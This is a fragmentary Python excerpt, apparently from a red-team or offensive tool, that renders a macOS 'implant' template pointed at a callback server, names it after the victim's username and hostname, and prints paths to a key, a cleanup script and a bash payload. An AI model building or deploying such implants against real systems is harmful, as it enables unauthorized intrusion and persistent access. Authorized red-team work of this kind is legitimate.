...
# {" ".join(core.getrandomwords(2))}"""
    ...
    implant = implant_template.render({
        ...
        "FQDN_PLACEHOLDER" : backflipServer.fqdn,
    ...
    implantName = f"macos-{victim.username}-{victim.hostname}-{backflipServer.fqdn}-{imaginarypayloadname}"
    ...
    print(f"[+] Path of backflip public key on infra: {victim.privKeyPath}\n")
    print(f"[+] Path of cleanup script on infra: {cleanupScriptsDir}/{implantName}_cleanup.py")
    print(f"[+] Path of payload script (this implant is a bash script, not a one-liner): {payloadsDir}/{implantName}.")
